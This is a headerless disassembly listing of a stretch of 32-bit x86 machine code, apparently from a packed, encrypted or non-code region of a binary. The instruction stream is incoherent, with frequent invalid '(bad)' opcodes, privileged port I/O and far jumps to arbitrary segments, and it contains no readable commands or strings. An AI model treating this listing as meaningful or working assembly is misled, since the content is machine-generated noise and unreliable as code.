  406adc:	ficomp DWORD PTR [ecx+edi*2+0x4b230dd4]
  406ae3:	das    
  406ae4:	jp     0x406a6b
  406ae6:	sbb    BYTE PTR [eax-0x1c50084a],cl
  406aec:	push   ds
  406aed:	das    
  406aee:	gs jno 0x406ac7
  406af1:	and    bl,bl
  406af3:	lahf   
  406af4:	in     al,0x43
  406af6:	and    eax,0x2a69fc4a
  406afb:	stos   DWORD PTR es:[edi],eax
  406afc:	sahf   
  406afd:	cmc    
  406afe:	ret    0xdb1e
  406b01:	(bad)  
  406b03:	aaa    
  406b04:	sti    
  406b05:	cmovno edi,esi
  406b08:	rol    DWORD PTR ds:0x59147b7c,cl
  406b0e:	test   DWORD PTR [edi+ecx*1],ebx
  406b11:	cli    
  406b12:	jecxz  0x406b0d
  406b14:	push   0x423b283a
  406b19:	into   
  406b1a:	xchg   esi,eax
  406b1b:	mov    ?,WORD PTR ds:0xf1d9cf74
  406b21:	std    
  406b22:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  406b24:	xchg   ebx,eax
  406b25:	adc    ecx,DWORD PTR [eax+0x3d8ba4f8]
  406b2b:	or     BYTE PTR [ebp-0x38],0x82
  406b2f:	pop    ss
  406b30:	cdq    
  406b31:	pop    edi
  406b32:	daa    
  406b33:	in     eax,0xa7
  406b35:	pop    esi
  406b36:	dec    esp
  406b37:	and    ebp,0xf14f7813
  406b3d:	loop   0x406ac3
  406b3f:	dec    ecx
  406b40:	or     esi,eax
  406b42:	popa   
  406b43:	jge    0x406b2a
  406b45:	add    DWORD PTR [eax-0x334db211],esp
  406b4b:	mov    esi,0xab77fe43
  406b50:	call   0x3d56:0x8a75d66e
  406b57:	(bad)  
  406b58:	mov    dh,0xf7
  406b5a:	test   eax,0x8a2922e0
  406b5f:	mov    ds:0x466b88fe,al
  406b64:	fwait
  406b65:	add    DWORD PTR [ecx+0x6c],ebp
  406b68:	iret   
  406b69:	aam    0xdd
  406b6b:	and    edx,DWORD PTR [esi+0x40]
  406b6e:	test   eax,0xdebcaf38
  406b73:	xor    DWORD PTR [ebx+0x2ca2bf11],0xffffffab
  406b7a:	pushf  
  406b7b:	dec    edi
  406b7c:	inc    esp
  406b7d:	loope  0x406b37
  406b7f:	ds push edx
  406b81:	(bad)  
  406b82:	ja     0x406bb4
  406b84:	mov    ch,BYTE PTR [ecx-0x7c]
  406b87:	pcmpgtb mm2,QWORD PTR [edx+0x74]
  406b8b:	repnz add al,0xe3
  406b8e:	js     0x406b13
  406b90:	gs sub eax,0xf8612568
  406b96:	mov    cl,BYTE PTR [edx]
  406b98:	add    edx,ecx
  406b9a:	add    DWORD PTR [edx],0x3c
  406b9d:	inc    edx
  406b9e:	(bad)  [esi]
  406ba0:	ins    BYTE PTR es:[edi],dx
  406ba1:	push   ebx
  406ba2:	cdq    
  406ba3:	dec    eax
  406ba5:	push   edi
  406ba6:	sub    DWORD PTR [edi+0x3b64bb82],edi
  406bac:	cdq    
  406bad:	dec    ecx
  406bae:	loope  0x406b3d
  406bb0:	xchg   BYTE PTR [edi+eiz*1],bl
  406bb3:	push   esp
  406bb4:	pop    esp
  406bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bb6:	pop    edi
  406bb7:	fiadd  DWORD PTR [ebx+0x70]
  406bba:	cmp    ecx,DWORD PTR [edi-0x7a]
  406bbd:	test   ch,0x78
  406bc0:	ins    DWORD PTR es:[edi],dx
  406bc1:	mov    edx,edi
  406bc3:	int3   
  406bc4:	nop
  406bc5:	std    
  406bc6:	push   eax
  406bc7:	push   ebx
  406bc8:	mov    cl,0x4a
  406bca:	std    
  406bcb:	fdivr  DWORD PTR [edi+0x47]
  406bce:	xchg   BYTE PTR [edi],cl
  406bd0:	sahf   
  406bd1:	or     DWORD PTR [ecx],esi
  406bd3:	stc    
  406bd4:	pushf  
  406bd5:	cmp    eax,0x15c389e7
  406bda:	sbb    al,ah
  406bdc:	dec    edx
  406bdd:	dec    edi
  406bde:	jle    0x406b86
  406be0:	xor    esi,esi
  406be2:	sbb    eax,0xb9fd0849
  406be7:	jg     0x406c01
  406be9:	jge    0x406b6d
  406beb:	repz and eax,0x471ac796
  406bf1:	frstor [ebx-0x6e631d89]
  406bf7:	adc    eax,0x59188396
  406bfc:	xchg   ebp,eax
  406bfd:	mov    al,ds:0xf220c67b
  406c02:	(bad)  
  406c03:	repnz aaa 
  406c05:	adc    DWORD PTR [edi+edi*1+0x74],esi
  406c09:	mov    ecx,0x30771c09
  406c0e:	imul   ebx,DWORD PTR [edi-0x3],0x17fd32b5
  406c15:	mov    edx,0xa4ab46f5
  406c1a:	mov    ds:0x1b1147d9,eax
  406c1f:	ss adc al,0xce
  406c22:	out    0x2b,eax
  406c24:	lods   al,BYTE PTR ds:[esi]
  406c25:	pop    ebp
  406c26:	adc    ebp,DWORD PTR [ecx-0x78789b75]
  406c2c:	mov    ebx,DWORD PTR [ebp-0x6d]
  406c2f:	div    BYTE PTR [esi]
  406c31:	(bad)  [edi]
  406c33:	inc    edi
  406c34:	jecxz  0x406c42
  406c36:	pop    edx
  406c37:	mov    bh,0xad
  406c39:	inc    eax
  406c3a:	mov    esp,0xa296828d
  406c3f:	cmp    edi,esp
  406c41:	mov    edi,0xa539514d
  406c46:	hlt    
  406c47:	dec    DWORD PTR [edi]
  406c49:	fdivr  DWORD PTR [esi-0x474d39b0]
  406c4f:	dec    ebx
  406c50:	scas   eax,DWORD PTR es:[edi]
  406c51:	into   
  406c52:	xchg   DWORD PTR [eax],edx
  406c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c55:	fbld   TBYTE PTR ds:0x538fbd2e
  406c5c:	jmp    0xae1d:0xb25d8039
  406c63:	pop    eax
  406c64:	mov    fs,ebx
  406c66:	push   edi
  406c67:	popf   
  406c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c69:	cli    
  406c6a:	ins    BYTE PTR es:[edi],dx
  406c6b:	push   ebp
  406c6c:	pusha  
  406c6d:	cmp    DWORD PTR [ebp-0x59],edx
  406c70:	mov    ?,WORD PTR [edi]
  406c72:	xchg   esp,eax
  406c73:	sub    al,0x62
  406c75:	cli    
  406c76:	mov    edx,0xd2b455f0
  406c7b:	ja     0x406c9a
  406c7d:	or     ecx,ebx
  406c7f:	and    eax,0xd0f12dd7
  406c84:	dec    esi
  406c85:	lahf   
  406c86:	out    dx,eax
  406c87:	nop
  406c88:	or     cl,0xac
  406c8b:	mov    ecx,0x47e67e71
  406c90:	pusha  
  406c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c92:	in     eax,0xec
  406c94:	pop    esi
  406c95:	test   eax,0x236c7cc3
  406c9a:	mov    dl,0xb
  406c9c:	mov    eax,0x6dfc5a3e
  406ca1:	mov    ebx,0x35f13d41
  406ca6:	ss scas eax,DWORD PTR es:[edi]
  406ca8:	jnp    0x406cbc
  406caa:	sahf   
  406cab:	cli    
  406cac:	sbb    eax,0xfc71744d
  406cb1:	repz out 0xd6,al
  406cb4:	mov    ecx,DWORD PTR ds:0x2af9a612
  406cba:	lds    eax,FWORD PTR ds:0xa8215b6
  406cc0:	jmp    FWORD PTR [ebx+0xa]
  406cc3:	cmp    BYTE PTR [ecx+0x39],ah
  406cc6:	jno    0x406c55
  406cc8:	cmp    DWORD PTR [esi+0x64],ecx
  406ccb:	jp     0x406d3a
  406ccd:	cmp    bl,BYTE PTR [eax]
  406ccf:	dec    esp
  406cd0:	xchg   esi,eax
  406cd1:	test   BYTE PTR [ecx-0x63],dl
  406cd4:	jns    0x406c65
  406cd6:	ret    0x777d
  406cd9:	inc    ebp
  406cda:	push   edx
  406cdb:	push   ebp
  406cdc:	out    dx,al
  406cdd:	out    0x5,eax
  406cdf:	sub    eax,0x25315f8d
  406ce4:	aad    0x43
  406ce6:	mov    al,0xca
  406ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce9:	xchg   ebp,eax
  406cea:	ss retf 
  406cec:	mov    al,0xdd
  406cee:	fldenv [eax+esi*2+0x3b]
  406cf2:	and    DWORD PTR [ebx-0x8],ebx
  406cf5:	mov    bh,0xc6
  406cf7:	mov    WORD PTR [esi-0x61],ds
  406cfa:	pop    esi
  406cfb:	xlat   BYTE PTR ds:[ebx]
  406cfc:	es sub al,0xd
  406cff:	mov    ch,0x1a
  406d01:	pop    ds
  406d02:	outs   dx,DWORD PTR ds:[esi]
  406d03:	mov    edi,DWORD PTR [edi]
  406d05:	mov    dl,0x90
  406d07:	int    0x7f
  406d09:	inc    BYTE PTR [ebx]
  406d0b:	xchg   edi,eax
  406d0c:	xor    BYTE PTR [esi+0x2ae8153c],0xde
  406d13:	sbb    ah,cl
  406d15:	imul   ebp,ecx,0xffffffcb
  406d18:	push   es
  406d19:	sbb    eax,0x81a49f21
  406d1e:	dec    edi
  406d1f:	dec    ebx
  406d20:	pop    ss
  406d21:	xor    al,BYTE PTR [ecx-0x71]
  406d24:	movaps XMMWORD PTR [ecx-0x47bf714a],xmm1
  406d2b:	mov    esi,0x3aff6e88
  406d30:	adc    ebp,edi
  406d32:	and    eax,esi
  406d34:	jl     0x406d97
  406d36:	ror    DWORD PTR [eax+0x71],cl
  406d39:	dec    edi
  406d3a:	adc    ebx,eax
  406d3c:	push   edx
  406d3d:	mov    ebx,0x79674e18
  406d42:	ins    DWORD PTR es:[edi],dx
  406d43:	in     al,0xf5
  406d45:	popf   
  406d46:	maskmovq mm7,(bad)
  406d47:	idiv   DWORD PTR [eax-0x75]
  406d4a:	add    bl,BYTE PTR [edi]
  406d4c:	int    0x7e
  406d4e:	mov    eax,0x18d21427
  406d53:	sub    al,0x57
  406d55:	or     BYTE PTR [ebx-0x54],0xad
  406d59:	(bad)  
  406d5a:	test   BYTE PTR [edi+0x5a],0x80
  406d5e:	xchg   BYTE PTR [edi-0x1d226b25],al
  406d64:	in     al,dx
  406d65:	sub    al,0x3a
  406d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d68:	sub    eax,0x2d00108d
  406d6d:	les    edx,FWORD PTR [ebx+0x11c0c158]
  406d73:	rcr    ecx,1
  406d75:	(bad)  
  406d76:	mov    al,ds:0xe45b15c9
  406d7b:	in     eax,dx
  406d7c:	xchg   edx,eax
  406d7d:	clc    
  406d7e:	adc    eax,0xfb44b2ea
  406d83:	push   ebx
  406d84:	lahf   
  406d85:	push   0x10551672
  406d8a:	jge    0x406db4
  406d8c:	fs sbb al,0x98
  406d8f:	fcomp  DWORD PTR [eax]
  406d91:	sbb    ebp,eax
  406d93:	ror    BYTE PTR [ebx],1
  406d95:	dec    edx
  406d96:	inc    esi
  406d97:	pop    esi
  406d98:	or     BYTE PTR [esi+0x7a],cl
  406d9b:	adc    al,0xf0
  406d9d:	pop    ds
  406d9e:	test   DWORD PTR [ebp+0x3c],edi
  406da1:	sbb    DWORD PTR [edx+0x26],ebx
  406da4:	mov    ebx,0x300d633d
  406da9:	sub    ch,al
  406dab:	call   0x2024:0xe12575c6
  406db2:	dec    edx
  406db3:	mov    eax,0xdea5b3c3
  406db8:	sub    eax,0xa1828ce
  406dbd:	stos   DWORD PTR es:[edi],eax
  406dbe:	(bad)  
  406dbf:	jbe    0x406df1
  406dc1:	xchg   edi,eax
  406dc2:	loopne 0x406def
  406dc4:	les    esi,FWORD PTR [ebp+0x7]
  406dc7:	test   esi,ecx
  406dc9:	pop    ebp
  406dca:	and    dl,cl
  406dcc:	push   0xffffffc7
  406dce:	xchg   ecx,eax
  406dcf:	lock in al,0xca
  406dd2:	jae    0x406ddb
  406dd4:	mov    edi,DWORD PTR [edx-0x7f]
  406dd7:	repz pop ebx
  406dd9:	in     al,dx
  406dda:	mov    ds:0xcb06be3e,al
  406ddf:	jnp    0x406e07
  406de1:	aad    0x2c
  406de3:	leave  
  406de4:	adc    BYTE PTR [eax-0x4a],0xf5
  406de8:	xor    eax,DWORD PTR [esi]
  406dea:	mov    al,0xe9
  406dec:	mov    ch,0x75
  406dee:	lods   al,BYTE PTR ds:[esi]
  406def:	mov    DWORD PTR [edi],esp
  406df1:	cmp    BYTE PTR [edi],0x6
  406df4:	xor    eax,0xdce864a6
  406df9:	push   esi
  406dfa:	pop    eax
  406dfb:	int3   
  406dfc:	jbe    0x406e0c
  406dfe:	xor    bh,BYTE PTR [ebx-0x10]
  406e01:	cwde   
  406e02:	push   0xe2aa6b31
  406e07:	mov    bl,0xc0
  406e09:	out    dx,al
  406e0a:	xor    ebp,DWORD PTR [ebx-0x5d]
  406e0d:	push   esi
  406e0e:	cdq    
  406e0f:	fld    TBYTE PTR [eax-0x22b0cb77]
  406e15:	mov    al,ds:0xf0355435
  406e1a:	mov    BYTE PTR ds:0x136d29d,ch
  406e20:	mov    ecx,0x1fc4f29e
  406e25:	das    
  406e26:	aad    0x22
  406e28:	imul   ebx,DWORD PTR [esi+0x386d9e56],0x6d
  406e2f:	lea    eax,[edi+0x7]
  406e32:	mov    al,ds:0x14622727
  406e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e38:	stos   DWORD PTR es:[edi],eax
  406e39:	lock cmp al,0x12
  406e3c:	xor    eax,0xa62c3d6f
  406e41:	jl     0x406e8b
  406e43:	popf   
  406e44:	jae    0x406de2
  406e46:	xor    ebp,DWORD PTR [ecx-0x41]
  406e49:	jge    0x406de4
  406e4b:	lock and dh,BYTE PTR [bp+di-0x49]
  406e50:	les    ebx,FWORD PTR ds:0xc7a9e261
  406e56:	ror    cl,1
  406e58:	je     0x406e47
  406e5a:	jecxz  0x406e8f
  406e5c:	bound  edi,QWORD PTR [ecx-0x56420bb5]
  406e62:	retf   0xbedb
  406e65:	cmp    esp,eax
  406e67:	add    eax,0xd890828d
  406e6c:	aaa    
  406e6d:	pop    esp
  406e6e:	mov    bh,BYTE PTR [ebx-0x4f]
  406e71:	and    BYTE PTR [ebp-0x51c7d984],dl
  406e77:	cmp    eax,0xd30295e9
  406e7c:	inc    edi
  406e7d:	xlat   BYTE PTR ds:[ebx]
  406e7e:	in     eax,dx
  406e7f:	adc    al,0x57
  406e81:	jae    0x406ec2
  406e83:	jbe    0x406eaa
  406e85:	call   FWORD PTR [edi+ebp*1+0x61]
  406e89:	fst    QWORD PTR [eax+0x5c]
  406e8c:	out    dx,al
  406e8d:	xchg   BYTE PTR [ebx+0x405fc798],bl
  406e93:	pusha  
  406e94:	outs   dx,DWORD PTR ds:[esi]
  406e95:	sahf   
  406e96:	and    eax,0x48b9b4cf
  406e9b:	test   al,0x3a
  406e9d:	ja     0x406ee8
  406e9f:	sbb    BYTE PTR [ebx-0x294d12a4],ah
  406ea5:	xchg   esi,eax
  406ea6:	xchg   esp,eax
  406ea7:	inc    edi
  406ea8:	jge    0x406e60
  406eaa:	mov    ch,0xe0
  406eac:	out    0x4c,al
  406eae:	or     al,0x7c
  406eb0:	les    edx,FWORD PTR ds:0x8c4d648
  406eb6:	addr16 pop edx
  406eb8:	mov    dl,0xb3
  406eba:	pop    esi
  406ebb:	push   esp
  406ebc:	or     BYTE PTR [ebp-0x7],0x42
  406ec0:	enter  0xce6c,0xb0
  406ec4:	(bad)  
  406ec5:	mov    BYTE PTR [ebx+0x7db8c0b9],ah
  406ecb:	data16 add al,0x75
  406ece:	(bad)  
  406ecf:	cmp    esp,DWORD PTR [ebp+0x644c7a22]
  406ed5:	dec    ebp
  406ed6:	mov    al,BYTE PTR [ebx+eax*8-0x13]
  406eda:	dec    edx
  406edb:	sub    ah,BYTE PTR [ebx-0x26020d20]
  406ee1:	(bad)  
  406ee3:	xor    ecx,ecx
  406ee5:	sti    
  406ee6:	psubd  mm5,QWORD PTR [edx-0x63]
  406eea:	loop   0x406ebb
  406eec:	cmp    BYTE PTR [edi-0x7d],bl
  406eef:	adc    eax,0xcd286bc4
  406ef4:	pop    ecx
  406ef5:	into   
  406ef6:	xor    eax,DWORD PTR [ebp-0x6a]
  406ef9:	add    DWORD PTR [edi+0x7807f970],edx
  406eff:	jecxz  0x406ee9
  406f01:	xor    DWORD PTR [eax+0x7d037b3b],ebx
  406f07:	push   ebp
  406f08:	pop    esp
  406f09:	push   esi
  406f0a:	(bad)  
  406f0b:	push   esp
  406f0c:	adc    BYTE PTR [edi],cl
  406f0e:	mov    bh,0x16
  406f10:	add    ah,ch
  406f12:	xor    dl,BYTE PTR [ebx]
  406f14:	fs lahf 
  406f16:	push   ebp
  406f17:	xor    al,0x8c
  406f19:	lods   eax,DWORD PTR ds:[esi]
  406f1a:	add    DWORD PTR [ebx-0x58],edx
  406f1d:	adc    edx,ecx
  406f1f:	mov    edx,0xc8593695
  406f24:	sub    al,0x83
  406f26:	test   ecx,esi
  406f28:	leave  
  406f29:	dec    esp
  406f2a:	lds    ebp,FWORD PTR [edx]
  406f2c:	jl     0x406f1b
  406f2e:	mov    dl,0xb3
  406f30:	sbb    BYTE PTR [ecx],ah
  406f32:	fisubr DWORD PTR [eax+0x23]
  406f35:	std    
  406f36:	push   edx
  406f37:	adc    BYTE PTR ds:0xdd011bf7,dl
  406f3d:	push   ecx
  406f3e:	inc    edi
  406f3f:	sbb    dh,dh
  406f41:	mov    esp,0x75809550
  406f46:	dec    edx
  406f47:	mov    ds:0x3e7eb82b,eax
  406f4c:	shr    BYTE PTR [esi],1
  406f4e:	or     eax,0x2a867c36
  406f53:	sti    
  406f54:	cmp    ebx,eax
  406f56:	and    al,0x28
  406f58:	pop    eax
  406f59:	inc    ebp
  406f5a:	sbb    BYTE PTR [ebp+0x6c2f526a],al
  406f60:	sbb    esi,esi
  406f62:	xchg   DWORD PTR [edx-0x26],edx
  406f65:	mov    esp,0x650281dc
  406f6a:	es jmp 0x9ae0:0xab6b4c9c
  406f72:	xchg   ecx,eax
  406f73:	or     esi,DWORD PTR [ebp-0x4094a1c8]
  406f79:	loopne 0x406f6e
  406f7b:	sbb    eax,0x408be8e2
  406f80:	daa    
  406f81:	je     0x406f55
  406f83:	retf   0x2454
  406f86:	ja     0x406fdd
  406f88:	hlt    
  406f89:	adc    ebx,ebx
  406f8b:	jnp    0x406f9e
  406f8d:	adc    DWORD PTR [ecx-0x606c6edb],0x19
  406f94:	push   eax
  406f95:	out    dx,al
  406f96:	cmp    dh,cl
  406f98:	mov    eax,ds:0xb1ed1dd1
  406f9d:	add    DWORD PTR [esi],esp
  406f9f:	hlt    
  406fa0:	xor    BYTE PTR [eax-0x6bc1342c],0xd8
  406fa7:	or     ebx,DWORD PTR [edx+0x15]
  406faa:	mov    edx,0xef023816
  406faf:	fs push esi
  406fb1:	cdq    
  406fb2:	sbb    eax,0xce46e573
  406fb7:	inc    esi
  406fb8:	arpl   WORD PTR [ebp-0x73b1ff79],si
  406fbe:	mov    ds:0x311c8ce,eax
  406fc3:	int3   
  406fc4:	popa   
  406fc5:	xlat   BYTE PTR ds:[ebx]
  406fc6:	jbe    0x407027
  406fc8:	(bad)  
  406fc9:	les    edi,FWORD PTR [ecx-0x2f76b193]
  406fcf:	jecxz  0x40701c
  406fd1:	adc    dh,cl
  406fd3:	(bad)
  406fd7:	inc    edi
  406fd8:	xchg   ebp,eax
  406fd9:	jo     0x406fac
  406fdb:	(bad)  
  406fdc:	fild   QWORD PTR [edi]
  406fde:	(bad)  
  406fdf:	sub    ebx,DWORD PTR [edi+0x490f5d0d]
  406fe5:	outs   dx,BYTE PTR ds:[esi]
  406fe6:	test   eax,0xfc16525c
  406feb:	adc    dh,ch
  406fed:	fsubp  st(3),st
  406fef:	lahf   
  406ff0:	lea    esi,[esi]
  406ff2:	ror    ch,0xc8
  406ff5:	(bad)  [esi]
  406ff7:	(bad)  
  406ff8:	sub    BYTE PTR [edx],bl
  406ffa:	ror    dh,cl
  406ffc:	mov    ebp,0x7e1c10db
  407001:	adc    eax,ebp
  407003:	nop
  407004:	push   ss
  407005:	or     BYTE PTR [esi-0x48c64289],0x10
  40700c:	mov    DWORD PTR [ebp-0x5f],edx
  40700f:	bnd jo 0x406f97
  407012:	sti    
  407013:	push   ds
  407014:	mov    cl,0xf2
  407016:	stos   DWORD PTR es:[edi],eax
  407017:	repz cmc 
  407019:	dec    edi
  40701a:	out    0x8e,al
  40701c:	ins    BYTE PTR es:[edi],dx
  40701d:	test   eax,0x4cf14e47
  407022:	pop    ss
  407023:	sub    al,0xfd
  407026:	mov    bl,0xdd
  407028:	xchg   ebp,eax
  407029:	sbb    BYTE PTR [ecx],0xf
  40702c:	xlat   BYTE PTR ds:[ebx]
  40702d:	arpl   bx,si
  40702f:	pop    ss
  407030:	pop    esi
  407031:	push   ebp
  407032:	add    al,ch
  407034:	scas   eax,DWORD PTR es:[edi]
  407035:	sbb    al,0x6f
  407037:	aaa    
  407038:	and    dl,BYTE PTR [edx+0x42333613]
  40703e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40703f:	jge    0x407087
  407041:	xchg   DWORD PTR fs:[eax+0x16a4ca3e],esi
  407048:	xchg   ecx,eax
  407049:	jmp    0x5455a7fc
  40704e:	(bad)  
  407050:	xor    ebx,ecx
  407052:	or     al,BYTE PTR [esi]
  407054:	daa    
  407055:	aam    0x77
  407057:	sar    BYTE PTR [edx],0xef
  40705a:	bound  ecx,QWORD PTR [esi+0x43c7bd6b]
  407060:	xor    BYTE PTR [eax],dl
  407062:	loope  0x4070de
  407064:	ins    BYTE PTR es:[edi],dx
  407065:	xchg   al,dl
  407067:	xor    eax,0x74798df7
  40706c:	dec    BYTE PTR [edx]
  40706e:	cmp    eax,0x1a84f1df
  407073:	inc    ecx
  407074:	mov    esp,0xc0ce15e9
  407079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40707a:	repnz mov ebp,0x5cb953c8
  407080:	sar    DWORD PTR [ecx-0x7bd515a0],0xc1
  407087:	aam    0xdd
  407089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40708a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40708b:	xor    bl,BYTE PTR ds:0x9db0e74e
  407091:	inc    esp
  407092:	mov    DWORD PTR [edx],ebx
  407094:	xchg   ebx,eax
  407095:	jno    0x4070ca
  407097:	jmp    0xaec88603
  40709c:	sti    
  40709d:	cmp    dh,BYTE PTR [ecx]
  40709f:	pop    eax
  4070a0:	das    
  4070a1:	xor    al,0x1d
  4070a3:	and    BYTE PTR [ebp-0x4],dh
  4070a6:	dec    edi
  4070a7:	call   0x154fe95
  4070ac:	dec    esi
  4070ad:	inc    esp
  4070ae:	jnp    0x407075
  4070b0:	push   ss
  4070b1:	ret    
  4070b2:	(bad)  
  4070b3:	pop    edi
  4070b4:	lea    eax,[edx]
  4070b6:	dec    esp
  4070b7:	sti    
  4070b8:	ror    BYTE PTR [ebx],0x10
  4070bb:	dec    ebp
  4070bc:	add    al,0x21
  4070be:	jae    0x407101
  4070c0:	ss retf 
  4070c2:	out    0xf1,al
  4070c4:	(bad)  
  4070c6:	int    0x72
  4070c8:	repnz xor bl,BYTE PTR [esi]
  4070cb:	or     DWORD PTR [esi-0x1a],ecx
  4070ce:	test   eax,0xc0cb7227
  4070d3:	(bad)
  4070d6:	fist   DWORD PTR [ebx]
  4070d8:	dec    edi
  4070d9:	mul    BYTE PTR ds:0x2c06ac18
  4070df:	mov    ch,0x1
  4070e1:	sahf   
  4070e2:	hlt    
  4070e3:	ins    DWORD PTR es:[edi],dx
  4070e4:	sbb    DWORD PTR [esi-0x32],esi
  4070e7:	retf   0x86b2
  4070ea:	pop    ebx
  4070eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ec:	test   BYTE PTR [edx+0x377279b5],cl
  4070f2:	mov    edi,0x9860e31e
  4070f7:	cs jp  0x40712a
  4070fa:	push   eax
  4070fb:	cmp    bh,BYTE PTR [ebx]
  4070fd:	inc    edi
  4070fe:	and    BYTE PTR [edi],0x7a
  407101:	jae    0x407166
  407103:	cmp    esi,ebx
  407105:	pusha  
  407106:	out    0xa8,al
  407108:	fmul   QWORD PTR [edi+edi*4+0xf3bc4a7]
  40710f:	xor    DWORD PTR [edi],edi
  407111:	int3   
  407112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407113:	fdiv   QWORD PTR [edi]
  407115:	(bad)
  407118:	add    DWORD PTR [ebp-0xf],esi
  40711b:	ror    BYTE PTR [esi+0x1a3e8673],cl
  407121:	cdq    
  407122:	pusha  
  407123:	jns    0x407172
  407125:	xchg   esp,eax
  407126:	call   0xfc090b67
  40712b:	sub    eax,0xca2bc38
  407130:	cwde   
  407131:	jbe    0x40717d
  407133:	dec    eax
  407134:	std    
  407135:	pop    ds
  407136:	inc    ebx
  407137:	push   edx
  407138:	sbb    al,0xae
  40713a:	and    al,BYTE PTR [eax+eiz*2-0x7ef63be5]
  407141:	sbb    ah,ah
  407143:	nop
  407144:	lahf   
  407145:	xor    eax,0xd160df66
  40714a:	dec    edx
  40714b:	mov    esp,DWORD PTR [ebx]
  40714d:	es gs fmulp st(2),st
  407151:	ds jmp 0xc3e691d4
  407157:	mov    ds:0xe08aa0c2,eax
  40715c:	push   ss
  40715d:	mov    ebp,0x89e81cc9
  407162:	push   ecx
  407163:	jmp    0xbf09:0xadffe0bc
  40716a:	enter  0x47,0xee
  40716e:	inc    eax
  40716f:	in     al,dx
  407170:	arpl   di,sp
  407172:	push   0xffffff9b
  407174:	sbb    eax,0x4dad274b
  407179:	in     al,0x64
  40717b:	dec    ebp
  40717c:	jl     0x407118
  40717e:	ret    
  40717f:	in     al,0x8a
  407181:	inc    ebp
  407182:	fiadd  DWORD PTR [ebx+eiz*1+0x6e]
  407186:	jg     0x407122
  407188:	pop    esi
  407189:	(bad)  
  40718b:	ror    DWORD PTR [edi],1
  40718d:	push   ecx
  40718e:	xor    dh,BYTE PTR [esi-0x5c]
  407191:	push   ds
  407192:	lea    ebx,[eax]
  407194:	inc    esp
  407195:	leave  
  407196:	shr    esp,1
  407198:	dec    edi
  407199:	push   ebx
  40719a:	or     bl,ah
  40719c:	jo     0x40711f
  40719e:	repnz sub BYTE PTR [edx-0x6b],0xd6
  4071a3:	push   ebx
  4071a4:	test   eax,0x1551f3d5
  4071a9:	add    DWORD PTR [ebx-0x2c],ebp
  4071ac:	sub    eax,0xc254e88b
  4071b1:	mov    eax,ds:0xc8f5df7b
  4071b6:	or     eax,0x95e9f4d4
  4071bb:	cld    
  4071bc:	cmc    
  4071bd:	mov    ds:0xabbbd8eb,eax
  4071c2:	std    
  4071c3:	retf   0xa7eb
  4071c6:	push   ss
  4071c7:	push   ecx
  4071c8:	rol    bh,0xb1
  4071cb:	mov    esp,0x47440a7d
  4071d0:	sbb    eax,0x7a0eacf5
  4071d5:	pop    ds
  4071d6:	xor    DWORD PTR [edi],0xf0175dfc
  4071dc:	ins    DWORD PTR es:[edi],dx
  4071dd:	jnp    0x4071aa
  4071df:	sub    al,0xd4
  4071e1:	sbb    ebp,0x3aef7f4
  4071e7:	jns    0x4071ac
  4071e9:	ret    
  4071ea:	cmp    al,0x82
  4071ec:	mov    ecx,0xf4e2e4dc
  4071f1:	xlat   BYTE PTR ds:[ebx]
  4071f2:	sbb    DWORD PTR [edx+0x45498afd],0xffffffa1
  4071f9:	imul   edx,DWORD PTR [ecx+0x66848bfa],0x55
  407200:	add    DWORD PTR [esi],0x11da9700
  407206:	outs   dx,DWORD PTR ds:[esi]
  407207:	das    
  407208:	fs stc 
  40720a:	js     0x4071dc
  40720c:	int    0x83
  40720e:	(bad)  
  40720f:	ss jmp 0x7c7d:0x8f68bf41
  407217:	das    
  407218:	sub    DWORD PTR [ebx-0x4b90ea20],ebp
  40721e:	pop    esi
  40721f:	stos   BYTE PTR es:[edi],al
  407220:	or     ebp,edx
  407222:	mov    al,ds:0x1fa3f664
  407227:	adc    BYTE PTR [ebx],bl
  407229:	shr    DWORD PTR [ecx-0x2790b3b],0x2b
  407230:	pop    edi
  407231:	ret    0x8fdb
  407234:	ins    DWORD PTR es:[edi],dx
  407235:	popf   
  407236:	push   ebp
  407237:	add    ebx,ebp
  407239:	jle    0x2666d04a
  40723f:	dec    eax
  407240:	ret    
  407241:	dec    edi
  407242:	imul   eax,DWORD PTR [ebx],0xffffffe7
  407245:	hlt    
  407246:	lock cli 
  407248:	cli    
  407249:	cmp    esi,ebp
  40724b:	ror    DWORD PTR [eax],1
  40724d:	jnp    0x407235
  40724f:	inc    ecx
  407250:	mov    cl,0xb3
  407252:	lahf   
  407253:	scas   al,BYTE PTR es:[edi]
  407254:	inc    esi
  407255:	cli    
  407256:	pop    ebp
  407257:	or     BYTE PTR [esi+edx*4],dl
  40725a:	clc    
  40725b:	das    
  40725c:	and    BYTE PTR ds:0xfc452394,dl
  407262:	xchg   DWORD PTR [esi],esi
  407264:	call   0xffd396b7
  407269:	add    WORD PTR fs:[edi-0x7e],cx
  40726e:	xchg   ebx,eax
  40726f:	jb     0x40721c
  407271:	test   BYTE PTR [edi+esi*4+0x36],bh
  407275:	pushf  
  407276:	fidivr WORD PTR [ebx-0x36]
  407279:	push   ds
  40727a:	pushf  
  40727b:	aaa    
  40727c:	or     ah,BYTE PTR [edx-0x13]
  40727f:	pusha  
  407280:	aaa    
  407281:	inc    ebp
  407282:	popa   
  407283:	(bad)  
  407284:	pop    ds
  407285:	xchg   esi,eax
  407286:	xlat   BYTE PTR ds:[ebx]
  407287:	lods   eax,DWORD PTR ds:[esi]
  407288:	pop    esp
  407289:	inc    edi
  40728a:	(bad)  
  40728b:	sbb    esp,DWORD PTR [ecx]
  40728d:	lds    edi,FWORD PTR [ecx+edi*8-0x7e1e2150]
  407294:	cmp    ah,al
  407296:	jo     0x40726c
  407298:	push   es
  407299:	jg     0x4072da
  40729b:	std    
  40729c:	mov    esp,0x6bac170b
